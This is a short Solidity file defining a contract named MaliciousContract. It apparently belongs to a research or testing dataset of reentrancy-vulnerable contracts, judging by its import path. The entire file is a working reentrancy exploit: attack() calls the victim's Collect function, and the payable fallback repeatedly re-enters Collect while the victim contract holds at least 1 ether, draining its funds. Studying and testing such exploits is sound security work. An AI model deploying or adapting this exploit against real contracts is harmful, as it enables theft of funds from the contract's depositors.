pragma solidity ^0.4.19;

import "../dataset/reentrancy/0x561eac93c92360949ab1f1403323e6db345cbf31.sol";

contract MaliciousContract {
    BANK_SAFE bank_SAFE;

    constructor(address _victimAddress) public {
        bank_SAFE = BANK_SAFE(_victimAddress);
    }

    function attack(uint256 amount) public {
        require(
            amount >= 1 ether,
            "Must attempt and attack with at least 1 ether"
        );
        bank_SAFE.Collect(amount);
    }

    function deposit() public payable {
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        bank_SAFE.Deposit.value(msg.value)();
    }

    function() public payable {
        // Re-enter the vulnerable function if there's still balance to collect
        if (address(bank_SAFE).balance >= 1 ether) {
            bank_SAFE.Collect(1 ether);
        }
    }
}
